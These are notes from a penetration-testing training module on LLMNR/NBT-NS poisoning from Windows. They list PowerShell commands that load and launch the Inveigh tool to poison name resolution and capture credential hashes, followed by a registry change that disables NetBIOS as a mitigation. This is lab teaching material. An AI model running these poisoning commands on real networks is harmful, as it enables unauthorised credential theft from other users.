# Section 7: LLMNR/NBT-NS Poisoning - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1420
- Code/command blocks: 4

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell
.\Inveigh.exe
```

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

